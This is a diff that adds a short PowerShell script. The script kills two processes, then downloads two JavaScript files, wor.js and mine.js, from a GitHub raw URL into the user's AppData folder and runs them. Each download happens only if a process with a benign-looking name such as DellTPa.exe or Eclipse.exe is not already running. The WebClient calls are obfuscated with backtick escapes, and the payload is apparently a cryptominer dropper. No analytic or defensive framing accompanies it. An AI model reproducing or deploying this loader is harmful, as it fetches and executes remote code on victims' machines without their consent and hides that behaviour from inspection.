@@ -1,0 +1,29 @@
+Stop-Process -Name "wor"
+Stop-Process -Name "mpu"
+
+Function dwn
+{
+	
+  $running = Get-Process DellTPa.exe -ErrorAction SilentlyContinue
+   
+    if (!$running)
+    {
+        
+		(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/nmaroun/fiijjjjjkgjhghgh.html/main/wor.js', "C:\Users\$env:UserName\AppData\Local\Programs\Common\wor.js");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\wor.js");
+	
+	}
+		
+	 $running1 = Get-Process Eclipse.exe -ErrorAction SilentlyContinue
+	 if (!$running1)
+	
+	 {
+		 
+(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/nmaroun/fiijjjjjkgjhghgh.html/main/mine.js', "C:\Users\$env:UserName\AppData\Local\Programs\Common\mine.js");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\mine.js");
+
+		}
+		
+}
+
+
+IEX dwn
+
